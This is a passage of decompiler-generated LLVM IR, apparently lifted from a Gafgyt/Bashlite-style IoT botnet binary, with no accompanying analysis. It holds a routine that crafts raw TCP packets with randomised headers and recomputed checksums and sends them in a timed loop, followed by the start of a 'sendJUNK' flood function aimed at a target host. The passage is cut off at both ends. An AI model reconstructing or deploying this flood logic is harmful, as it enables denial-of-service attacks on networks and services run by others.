  %v0_804ea97 = load i32, i32* @esp, align 4
  %v2_804ea97 = icmp ugt i32 %v0_804ea97, -17
  store i1 %v2_804ea97, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ea9a

dec_label_pc_804ea9a:                             ; preds = %dec_label_pc_804ea73, %dec_label_pc_804ea20, %dec_label_pc_804e9ca, %dec_label_pc_804e980, %dec_label_pc_804e93c, %dec_label_pc_804ea81
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804ea81 ], [ 4, %dec_label_pc_804ea73 ], [ %stack_var_-160.129, %dec_label_pc_804ea20 ], [ %stack_var_-160.129, %dec_label_pc_804e9ca ], [ %stack_var_-160.129, %dec_label_pc_804e980 ], [ %stack_var_-160.129, %dec_label_pc_804e93c ]
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805ade3.428, i32 0, i32 0), %dec_label_pc_804ea81 ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805ade3.428, i32 0, i32 0), %dec_label_pc_804ea73 ], [ %stack_var_-156.130, %dec_label_pc_804ea20 ], [ %stack_var_-156.130, %dec_label_pc_804e9ca ], [ %stack_var_-156.130, %dec_label_pc_804e980 ], [ %stack_var_-156.130, %dec_label_pc_804e93c ]
  %v0_804ea9a = load i32, i32* @esp, align 4
  %v5_804ea9a = icmp ult i32 %v0_804ea9a, 8
  store i1 %v5_804ea9a, i1* %cf.global-to-local, align 1
  %v1_804ea9d = add i32 %v0_804ea9a, -12
  %v2_804ea9d = inttoptr i32 %v1_804ea9d to i32*
  store i32 ptrtoint (i32* @global_var_805add1.423 to i32), i32* %v2_804ea9d, align 4
  %v1_804eaa2 = add i32 %v0_804ea9a, -16
  %v2_804eaa2 = inttoptr i32 %v1_804eaa2 to i32*
  store i32 0, i32* %v2_804eaa2, align 4
  %v2_804eaa4 = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804eaa4 = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804eaa4)
  store i32 %v3_804eaa4, i32* %eax.global-to-local, align 4
  store i32 %v3_804eaa4, i32* %tmp103, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804eaaf = icmp eq i32 %v3_804eaa4, 0
  %v1_804eab3 = icmp eq i1 %v5_804eaaf, false
  %tmp104 = inttoptr i32 %v3_804eaa4 to i8*
  br i1 %v1_804eab3, label %dec_label_pc_804e909, label %dec_label_pc_804eab9

dec_label_pc_804eab9:                             ; preds = %dec_label_pc_804ea9a, %dec_label_pc_804e8ed, %dec_label_pc_804e8ac
  %v0_804eab9 = phi i8* [ %v0_804eab9.pre, %dec_label_pc_804e8ac ], [ %v5_804e901, %dec_label_pc_804e8ed ], [ %tmp104, %dec_label_pc_804ea9a ]
  %v1_804eab9 = ptrtoint i8* %v0_804eab9 to i32
  %v2_804eab9 = call i32 @rand_cmwc(i32 %v1_804eab9)
  %sext8 = mul i32 %v2_804eab9, 65536
  %v1_804eabe = sdiv i32 %sext8, 65536
  store i32 %v1_804eabe, i32* %edx.global-to-local, align 4
  %v1_804eac3 = trunc i32 %v1_804eabe to i16
  %v3_804eac3 = add i32 %v2_804e7f0, 34
  %v4_804eac3 = inttoptr i32 %v3_804eac3 to i16*
  store i16 %v1_804eac3, i16* %v4_804eac3, align 2
  %v1_804eaca = add i32 %v2_804e7f0, 36
  %v2_804eaca = inttoptr i32 %v1_804eaca to i16*
  store i16 0, i16* %v2_804eaca, align 4
  store i32 %v1_804e808, i32* %eax.global-to-local, align 4
  %v1_804ead3 = add i32 %v2_804e7f0, 38
  %v2_804ead3 = inttoptr i32 %v1_804ead3 to i16*
  store i16 0, i16* %v2_804ead3, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804e6df, label %dec_label_pc_804eaea, label %dec_label_pc_804eadf

dec_label_pc_804eadf:                             ; preds = %dec_label_pc_804eab9
  %v0_804eadf = load i8*, i8** %stack_var_-20, align 4
  %v1_804eadf = ptrtoint i8* %v0_804eadf to i32
  %v2_804eadf = call i32 @rand_cmwc(i32 %v1_804eadf)
  store i32 %v2_804eadf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eb02

dec_label_pc_804eaea:                             ; preds = %dec_label_pc_804eab9
  %v1_804eaed = urem i32 %arg2, 65536
  store i32 %v1_804eaed, i32* %eax.global-to-local, align 4
  %v0_804eaf2 = load i32, i32* @esp, align 4
  %v5_804eaf2 = icmp ult i32 %v0_804eaf2, 12
  store i1 %v5_804eaf2, i1* %cf.global-to-local, align 1
  %v2_804eaf5 = add i32 %v0_804eaf2, -16
  %v3_804eaf5 = inttoptr i32 %v2_804eaf5 to i32*
  store i32 %v1_804eaed, i32* %v3_804eaf5, align 4
  %v1_804eaf6 = sext i16 %tmp47 to i32
  %v2_804eaf6 = call i32 @htons(i32 %v1_804eaf6)
  store i32 %v2_804eaf6, i32* %eax.global-to-local, align 4
  %v0_804eafb = load i32, i32* @esp, align 4
  %v2_804eafb = icmp ugt i32 %v0_804eafb, -17
  store i1 %v2_804eafb, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804eb02

dec_label_pc_804eb02:                             ; preds = %dec_label_pc_804eadf, %dec_label_pc_804eaea
  %storemerge.in = phi i32 [ %v2_804eaf6, %dec_label_pc_804eaea ], [ %v2_804eadf, %dec_label_pc_804eadf ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804e808, i32* %eax.global-to-local, align 4
  %v4_804eb05 = urem i32 %storemerge.in, 65536
  %v5_804eb05 = load i32, i32* @esi, align 4
  %v6_804eb05 = and i32 %v5_804eb05, -65536
  %v7_804eb05 = or i32 %v6_804eb05, %v4_804eb05
  store i32 %v7_804eb05, i32* @esi, align 4
  %v3_804eb09 = add i32 %v2_804e7f0, 22
  %v4_804eb09 = inttoptr i32 %v3_804eb09 to i16*
  store i16 %storemerge, i16* %v4_804eb09, align 2
  %v0_804eb0d = load i32, i32* @esp, align 4
  %v5_804eb0d = icmp ult i32 %v0_804eb0d, 8
  store i1 %v5_804eb0d, i1* %cf.global-to-local, align 1
  %v6_804eb10 = add i32 %v0_804eb0d, -12
  %v7_804eb10 = inttoptr i32 %v6_804eb10 to i32*
  store i32 %v1_804e808, i32* %v7_804eb10, align 4
  %v5_804eb13 = add i32 %v0_804eb0d, -16
  %v6_804eb13 = inttoptr i32 %v5_804eb13 to i32*
  store i32 %v2_804e7f0, i32* %v6_804eb13, align 4
  %v0_804eb16 = call i32 @tcpcsum()
  %v1_804eb16 = trunc i32 %v0_804eb16 to i16
  %sext13 = mul i32 %v0_804eb16, 65536
  %v1_804eb1e = sdiv i32 %sext13, 65536
  store i32 %v1_804eb1e, i32* %edx.global-to-local, align 4
  store i16 %v1_804eb16, i16* %v2_804eaca, align 4
  store i32 %v2_804e7f0, i32* %eax.global-to-local, align 4
  %v1_804eb2a = or i32 %v2_804e7f0, 2
  %v2_804eb2a = inttoptr i32 %v1_804eb2a to i16*
  %v3_804eb2a = load i16, i16* %v2_804eb2a, align 2
  %v4_804eb2a = zext i16 %v3_804eb2a to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804eb2a, i32* %edx.global-to-local, align 4
  store i32 %v2_804e7f0, i32* %eax.global-to-local, align 4
  %v1_804eb39 = load i32, i32* @esp, align 4
  %v2_804eb39 = add i32 %v1_804eb39, -4
  %v3_804eb39 = inttoptr i32 %v2_804eb39 to i32*
  store i32 %v4_804eb2a, i32* %v3_804eb39, align 4
  %v0_804eb3a = load i32, i32* %eax.global-to-local, align 4
  %v2_804eb3a = add i32 %v1_804eb39, -8
  %v3_804eb3a = inttoptr i32 %v2_804eb3a to i32*
  store i32 %v0_804eb3a, i32* %v3_804eb3a, align 4
  %sext14 = mul i32 %storemerge.in, 65536
  %v1_804eb3b = sdiv i32 %sext14, 65536
  %v3_804eb3b = inttoptr i32 %v1_804eb3b to i16*
  %v4_804eb3b = call i32 @csum(i16* %v3_804eb3b, i32 ptrtoint (i32* @0 to i32))
  %v5_804eb3b = trunc i32 %v4_804eb3b to i16
  %sext15 = mul i32 %v4_804eb3b, 65536
  %v1_804eb43 = sdiv i32 %sext15, 65536
  store i32 %v1_804eb43, i32* %edx.global-to-local, align 4
  store i32 %v2_804e7f0, i32* %eax.global-to-local, align 4
  %v3_804eb48 = or i32 %v2_804e7f0, 10
  %v4_804eb48 = inttoptr i32 %v3_804eb48 to i16*
  store i16 %v5_804eb3b, i16* %v4_804eb48, align 2
  %v0_804eb4c = load i32, i32* @esp, align 4
  %v5_804eb4c = icmp ult i32 %v0_804eb4c, 12
  store i1 %v5_804eb4c, i1* %cf.global-to-local, align 1
  %v1_804eb4f = add i32 %v0_804eb4c, -16
  %v2_804eb4f = inttoptr i32 %v1_804eb4f to i32*
  store i32 0, i32* %v2_804eb4f, align 4
  %v2_804eb51 = inttoptr i32 %v1_804eb3b to i32*
  %v3_804eb51 = call i32 @__GI_time(i32* %v2_804eb51)
  %v0_804eb56 = load i32, i32* @esp, align 4
  %v1_804eb56 = add i32 %v0_804eb56, 16
  %v5_804eb59 = add i32 %v3_804eb51, %arg3
  %v10_804eb59 = icmp ult i32 %v5_804eb59, %v3_804eb51
  store i1 %v10_804eb59, i1* %cf.global-to-local, align 1
  store i32 %v5_804eb59, i32* %eax.global-to-local, align 4
  %v2_804eba4 = or i32 %v2_804e7f0, 12
  %v3_804eba4 = inttoptr i32 %v2_804eba4 to i32*
  %v3_804ebb1 = or i32 %v2_804e7f0, 4
  %v4_804ebb1 = inttoptr i32 %v3_804ebb1 to i16*
  br label %dec_label_pc_804eb68

dec_label_pc_804eb68:                             ; preds = %dec_label_pc_804ec1f, %dec_label_pc_804ec3d, %dec_label_pc_804eb02
  %v0_804eb6e = phi i32 [ %v1_804eb56, %dec_label_pc_804eb02 ], [ %v0_804eb6e.pre.pre, %dec_label_pc_804ec3d ], [ %v1_804ec29, %dec_label_pc_804ec1f ]
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804eb02 ], [ %v4_804ec3d, %dec_label_pc_804ec3d ], [ 0, %dec_label_pc_804ec1f ]
  store i32 %v2_804e707, i32* %eax.global-to-local, align 4
  store i32 %v2_804e7f0, i32* %edx.global-to-local, align 4
  %v5_804eb6e = icmp ult i32 %v0_804eb6e, 8
  store i1 %v5_804eb6e, i1* %cf.global-to-local, align 1
  %v1_804eb71 = add i32 %v0_804eb6e, -12
  %v2_804eb71 = inttoptr i32 %v1_804eb71 to i32*
  store i32 16, i32* %v2_804eb71, align 4
  %v2_804eb73 = add i32 %v0_804eb6e, -16
  %v3_804eb73 = inttoptr i32 %v2_804eb73 to i32*
  store i32 %v2_804e707, i32* %v3_804eb73, align 4
  %v1_804eb74 = add i32 %v0_804eb6e, -20
  %v2_804eb74 = inttoptr i32 %v1_804eb74 to i32*
  store i32 0, i32* %v2_804eb74, align 4
  %v5_804eb76 = add i32 %v0_804eb6e, -24
  %v6_804eb76 = inttoptr i32 %v5_804eb76 to i32*
  store i32 %v1_804e7d0, i32* %v6_804eb76, align 4
  %v0_804eb79 = load i32, i32* %edx.global-to-local, align 4
  %v2_804eb79 = add i32 %v0_804eb6e, -28
  %v3_804eb79 = inttoptr i32 %v2_804eb79 to i32*
  store i32 %v0_804eb79, i32* %v3_804eb79, align 4
  %v5_804eb7a = add i32 %v0_804eb6e, -32
  %v6_804eb7a = inttoptr i32 %v5_804eb7a to i32*
  store i32 %v4_804e73e, i32* %v6_804eb7a, align 4
  %v1_804eb7d = load i32, i32* %stack_var_-64, align 4
  %v2_804eb7d = load i32, i32* %stack_var_-60, align 4
  %v3_804eb7d = load i32, i32* %stack_var_-56, align 4
  %v4_804eb7d = load i32, i32* %stack_var_-52, align 4
  %v6_804eb7d = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804eb7d, i32 %v2_804eb7d, i32 %v3_804eb7d, i32 %v4_804eb7d, i32 0)
  store i32 %v6_804eb7d, i32* @eax, align 4
  %v0_804eb82 = load i32, i32* @esp, align 4
  %v1_804eb82 = add i32 %v0_804eb82, 32
  %v5_804eb85 = icmp ult i32 %v1_804eb82, 12
  store i1 %v5_804eb85, i1* %cf.global-to-local, align 1
  %v5_804eb88 = add i32 %v0_804eb82, 16
  %v6_804eb88 = inttoptr i32 %v5_804eb88 to i32*
  store i32 %storemerge12, i32* %v6_804eb88, align 4
  %v1_804eb8b = call i32 @HackerScan2(i32 %stack_var_-68.0)
  store i32 %v1_804eb8b, i32* %eax.global-to-local, align 4
  %v0_804eb90 = load i32, i32* @esp, align 4
  %v1_804eb90 = add i32 %v0_804eb90, 16
  %v5_804eb93 = icmp ult i32 %v1_804eb90, 12
  store i1 %v5_804eb93, i1* %cf.global-to-local, align 1
  %v3_804eb96 = inttoptr i32 %v0_804eb90 to i32*
  store i32 %v1_804eb8b, i32* %v3_804eb96, align 4
  %v0_804eb97 = call i32 @htonl()
  %v0_804eb9c = load i32, i32* @esp, align 4
  %v2_804eb9c = icmp ugt i32 %v0_804eb9c, -17
  store i1 %v2_804eb9c, i1* %cf.global-to-local, align 1
  store i32 %v0_804eb97, i32* %edx.global-to-local, align 4
  store i32 %v2_804e7f0, i32* %eax.global-to-local, align 4
  store i32 %v0_804eb97, i32* %v3_804eba4, align 4
  %v1_804eba7 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext9 = mul i32 %v1_804eba7, 65536
  %v1_804ebac = sdiv i32 %sext9, 65536
  store i32 %v1_804ebac, i32* %edx.global-to-local, align 4
  store i32 %v2_804e7f0, i32* %eax.global-to-local, align 4
  %v1_804ebb1 = trunc i32 %v1_804ebac to i16
  store i16 %v1_804ebb1, i16* %v4_804ebb1, align 4
  %v1_804ebb5 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804ebb5, i32* %edx.global-to-local, align 4
  store i32 %v1_804e808, i32* %eax.global-to-local, align 4
  store i32 %v1_804ebb5, i32* %v3_804e85d, align 8
  %v1_804ebc2 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext10 = mul i32 %v1_804ebc2, 65536
  %v1_804ebc7 = sdiv i32 %sext10, 65536
  store i32 %v1_804ebc7, i32* %edx.global-to-local, align 4
  %v1_804ebcc = trunc i32 %v1_804ebc7 to i16
  store i16 %v1_804ebcc, i16* %v5_804e80b, align 4
  store i32 %v1_804e808, i32* %eax.global-to-local, align 4
  store i16 0, i16* %v2_804eaca, align 4
  %v0_804ebd8 = load i32, i32* @esp, align 4
  %v5_804ebd8 = icmp ult i32 %v0_804ebd8, 8
  store i1 %v5_804ebd8, i1* %cf.global-to-local, align 1
  %v6_804ebdb = add i32 %v0_804ebd8, -12
  %v7_804ebdb = inttoptr i32 %v6_804ebdb to i32*
  store i32 %v1_804e808, i32* %v7_804ebdb, align 4
  %v5_804ebde = add i32 %v0_804ebd8, -16
  %v6_804ebde = inttoptr i32 %v5_804ebde to i32*
  store i32 %v2_804e7f0, i32* %v6_804ebde, align 4
  %v0_804ebe1 = call i32 @tcpcsum()
  %v1_804ebe1 = trunc i32 %v0_804ebe1 to i16
  %sext17 = mul i32 %v0_804ebe1, 65536
  %v1_804ebe9 = sdiv i32 %sext17, 65536
  store i32 %v1_804ebe9, i32* %edx.global-to-local, align 4
  store i16 %v1_804ebe1, i16* %v2_804eaca, align 4
  store i32 %v2_804e7f0, i32* %eax.global-to-local, align 4
  %v3_804ebf5 = load i16, i16* %v2_804eb2a, align 2
  %v4_804ebf5 = zext i16 %v3_804ebf5 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804ebf5, i32* %edx.global-to-local, align 4
  store i32 %v2_804e7f0, i32* %eax.global-to-local, align 4
  %v1_804ec04 = load i32, i32* @esp, align 4
  %v2_804ec04 = add i32 %v1_804ec04, -4
  %v3_804ec04 = inttoptr i32 %v2_804ec04 to i32*
  store i32 %v4_804ebf5, i32* %v3_804ec04, align 4
  %v0_804ec05 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ec05 = add i32 %v1_804ec04, -8
  %v3_804ec05 = inttoptr i32 %v2_804ec05 to i32*
  store i32 %v0_804ec05, i32* %v3_804ec05, align 4
  %v1_804ec06 = load i32, i32* %stack_var_-64, align 4
  %v2_804ec06 = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804ec06 = call i32 @csum(i16* %v2_804ec06, i32 %v1_804ec06)
  %v4_804ec06 = trunc i32 %v3_804ec06 to i16
  %sext18 = mul i32 %v3_804ec06, 65536
  %v1_804ec0e = sdiv i32 %sext18, 65536
  store i32 %v1_804ec0e, i32* %edx.global-to-local, align 4
  store i32 %v2_804e7f0, i32* %eax.global-to-local, align 4
  store i16 %v4_804ec06, i16* %v4_804eb48, align 2
  store i32 %arg7, i32* @edi, align 4
  %v10_804ec1a = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804ec1a, i1* %cf.global-to-local, align 1
  %v15_804ec1a = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804ec1d = icmp eq i1 %v15_804ec1a, false
  br i1 %v1_804ec1d, label %dec_label_pc_804ec3d, label %dec_label_pc_804ec1f

dec_label_pc_804ec1f:                             ; preds = %dec_label_pc_804eb68
  %v0_804ec1f = load i32, i32* @esp, align 4
  %v5_804ec1f = icmp ult i32 %v0_804ec1f, 12
  store i1 %v5_804ec1f, i1* %cf.global-to-local, align 1
  %v1_804ec22 = add i32 %v0_804ec1f, -16
  %v2_804ec22 = inttoptr i32 %v1_804ec22 to i32*
  store i32 0, i32* %v2_804ec22, align 4
  %v1_804ec24 = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804ec24 = call i32 @__GI_time(i32* %v1_804ec24)
  store i32 %v2_804ec24, i32* %eax.global-to-local, align 4
  %v0_804ec29 = load i32, i32* @esp, align 4
  %v1_804ec29 = add i32 %v0_804ec29, 16
  %v10_804ec2c = icmp ult i32 %v2_804ec24, %v5_804eb59
  store i1 %v10_804ec2c, i1* %cf.global-to-local, align 1
  %v8_804ec2f = icmp sgt i32 %v2_804ec24, %v5_804eb59
  br i1 %v8_804ec2f, label %dec_label_pc_804ec45, label %dec_label_pc_804eb68

dec_label_pc_804ec3d:                             ; preds = %dec_label_pc_804eb68
  %v4_804ec3d = add i32 %stack_var_-68.0, 1
  %v0_804eb6e.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804eb68

dec_label_pc_804ec45:                             ; preds = %dec_label_pc_804ec1f, %dec_label_pc_804e704, %dec_label_pc_804e78d, %dec_label_pc_804e74f
  %v0_804ec4f = phi i32 [ %v4_804e711, %dec_label_pc_804e704 ], [ %v3_804e79b, %dec_label_pc_804e78d ], [ %v3_804e75d, %dec_label_pc_804e74f ], [ %v2_804ec24, %dec_label_pc_804ec1f ]
  store i32 %v0_804e6c3, i32* @ebx, align 4
  store i32 %v0_804e6c2, i32* @esi, align 4
  ret i32 %v0_804ec4f

; uselistorder directives
  uselistorder i32 %v2_804ec24, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804ebc7, { 1, 0 }
  uselistorder i32 %v1_804ebac, { 1, 0 }
  uselistorder i32 %v0_804eb97, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v0_804eb6e, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_804eb59, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804eb51, { 1, 0 }
  uselistorder i32 %v1_804eb3b, { 1, 0 }
  uselistorder i32 %v1_804eaed, { 1, 0 }
  uselistorder i32 %v1_804eabe, { 1, 0 }
  uselistorder i32 %v3_804eaa4, { 2, 1, 0, 3 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i32 %v1_804ea79, { 1, 0 }
  uselistorder i1 %v0_804ea60, { 1, 0 }
  uselistorder i32 %v6_804ea5e, { 1, 0 }
  uselistorder i32 %v1_804ea26, { 1, 0 }
  uselistorder i1 %v0_804ea0d, { 1, 0 }
  uselistorder i32 %v6_804ea0b, { 1, 0 }
  uselistorder i32 %v1_804e9d0, { 1, 0 }
  uselistorder i1 %v0_804e9b7, { 1, 0 }
  uselistorder i32 %v6_804e9b5, { 1, 0 }
  uselistorder i32 %v1_804e986, { 1, 0 }
  uselistorder i1 %v0_804e96d, { 1, 0 }
  uselistorder i32 %v6_804e96b, { 1, 0 }
  uselistorder i32 %v1_804e942, { 1, 0 }
  uselistorder i1 %v0_804e929, { 1, 0 }
  uselistorder i32 %v6_804e927, { 1, 0 }
  uselistorder i32 %v4_804e909, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 9, 10 }
  uselistorder i32 %stack_var_-160.129, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-156.130, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804ea89, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804ea76, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i32 %v1_804e8e2, { 1, 0 }
  uselistorder i32 %v1_804e8d6, { 1, 0 }
  uselistorder i32 %v1_804e8ca, { 1, 0 }
  uselistorder i32 %v1_804e8be, { 1, 0 }
  uselistorder i32 %v1_804e8b2, { 1, 0 }
  uselistorder i8* %v2_804e8af, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804e899, { 1, 0 }
  uselistorder i32 %v6_804e897, { 1, 0 }
  uselistorder i32 %v1_804e84b, { 1, 0 }
  uselistorder i32 %v0_804e82d, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_804e808, { 5, 6, 7, 8, 9, 10, 0, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 %v2_804e7f0, { 13, 12, 11, 10, 9, 8, 7, 25, 24, 23, 6, 5, 22, 4, 3, 21, 20, 19, 18, 26, 17, 16, 15, 14, 2, 1, 0 }
  uselistorder i32 %v2_804e7e5, { 1, 0, 2 }
  uselistorder i32 %v2_804e7c6, { 1, 0 }
  uselistorder i32 %v1_804e6ef, { 1, 0 }
  uselistorder i32* %stack_var_-172, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-60, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-64, { 1, 0, 3, 2 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 35, 17, 18, 19, 20, 21, 23, 22, 24, 26, 25, 27, 29, 28, 30, 32, 31, 33, 34, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 3, 2, 1, 0 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @HackerScan2, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ec45, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804eb68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804eb02, { 1, 0 }
  uselistorder label %dec_label_pc_804ea9a, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804e909, { 1, 0 }
  uselistorder label %dec_label_pc_804e7cd, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %dec_label_pc_804e704, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804ec53 = load i32, i32* @edi, align 4
  %v0_804ec54 = load i32, i32* @ebx, align 4
  store i32 %v0_804ec54, i32* %stack_var_-12, align 4
  %v12_804ec55 = ptrtoint i32* %stack_var_-220 to i32
  store i32 %v12_804ec55, i32* %eax.global-to-local, align 4
  %v1_804ec63 = call i32 @getdtablesize(i32 %v12_804ec55)
  store i32 %v1_804ec63, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_804ec63, 0
  %v2_804ec6c = zext i1 %tmp to i32
  %v2_804ec6f = add i32 %v2_804ec6c, %v1_804ec63
  %v2_804ec71 = sdiv i32 %v2_804ec6f, 2
  store i32 2, i32* %stack_var_-60, align 4
  %v1_804ec7f = urem i32 %arg2, 65536
  store i32 %v1_804ec7f, i32* %eax.global-to-local, align 4
  %v1_804ec88 = call i32 @htons(i32 %v1_804ec7f)
  %v2_804ec97 = ptrtoint i32* %stack_var_-60 to i32
  %v15_804ec9a = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_804ec9a, i32* %eax.global-to-local, align 4
  %v3_804eca1 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v3_804eca1, i32* %eax.global-to-local, align 4
  %v1_804eca9 = icmp eq i32 %v3_804eca1, 0
  br i1 %v1_804eca9, label %dec_label_pc_804ecb2, label %dec_label_pc_804efee

dec_label_pc_804ecb2:                             ; preds = %entry
  %v2_804ecc8 = mul i32 %v2_804ec71, 8
  %v1_804ecce = add i32 %v2_804ecc8, 30
  %v2_804ecd1 = and i32 %v1_804ecce, -16
  %v2_804ecd7 = sub i32 %v12_804ec55, %v2_804ecd1
  %v1_804ece5 = add i32 %v2_804ecd7, 15
  %v2_804ece8 = and i32 %v1_804ece5, -16
  %v2_804ed05 = mul i32 %v2_804ec71, 5
  store i32 %v2_804ed05, i32* %edx.global-to-local, align 4
  %v1_804ed0b = inttoptr i32 %v2_804ece8 to i8*
  store i32 %v2_804ece8, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804ed10 = and i32 %v1_804ece5, -256
  store i32 %v1_804ed10, i32* %eax.global-to-local, align 4
  %v5_804ed12 = call i8* @_memset(i8* %v1_804ed0b, i32 %v1_804ed10, i32 %v2_804ed05)
  %v0_804ed14 = load i32, i32* @esp, align 4
  %v1_804ed17 = add i32 %v0_804ed14, -16
  %v2_804ed17 = inttoptr i32 %v1_804ed17 to i32*
  store i32 1024, i32* %v2_804ed17, align 4
  %v1_804ed1c = call i32 @malloc(i32 %v2_804ece8)
  %v0_804ed21 = load i32, i32* @esp, align 4
  store i32 %v1_804ed1c, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v2_804ed34 = add i32 %v0_804ed21, 8
  %v3_804ed34 = inttoptr i32 %v2_804ed34 to i32*
  store i32 1024, i32* %v3_804ed34, align 4
  %v1_804ed35 = add i32 %v0_804ed21, 4
  %v2_804ed35 = inttoptr i32 %v1_804ed35 to i32*
  store i32 0, i32* %v2_804ed35, align 4
  %v0_804ed37 = load i32, i32* %edx.global-to-local, align 4
  %v3_804ed37 = inttoptr i32 %v0_804ed21 to i32*
  store i32 %v0_804ed37, i32* %v3_804ed37, align 4
  %v3_804ed38 = inttoptr i32 %v1_804ed1c to i8*
  %v4_804ed38 = call i32 @__GI_memset(i8* %v3_804ed38, i32 %tmp9, i32 %tmp6)
  store i32 %v4_804ed38, i32* %eax.global-to-local, align 4
  %v0_804ed3d = load i32, i32* @esp, align 4
  %v2_804ed43 = inttoptr i32 %v0_804ed3d to i32*
  store i32 0, i32* %v2_804ed43, align 4
  %v1_804ed45 = inttoptr i32 %v1_804ed1c to i32*
  %v2_804ed45 = call i32 @__GI_time(i32* %v1_804ed45)
  %v0_804ed4a = load i32, i32* @esp, align 4
  %v1_804ed4a = add i32 %v0_804ed4a, 16
  %v5_804ed4d = add i32 %v2_804ed45, %arg3
  store i32 %v5_804ed4d, i32* %eax.global-to-local, align 4
  %v3_804ed6a = or i32 %v2_804ece8, 4
  %v2_804ee55 = ptrtoint i32* %stack_var_-188 to i32
  %tmp35 = bitcast i32* %stack_var_-188 to i8*
  %v2_804eea9 = ptrtoint i32* %stack_var_-196 to i32
  %v2_804eee3 = ptrtoint i32* %stack_var_-200 to i32
  %v2_804eeea = ptrtoint i32* %stack_var_-204 to i32
  %v5_804efd238 = icmp sgt i32 %v2_804ec6f, 1
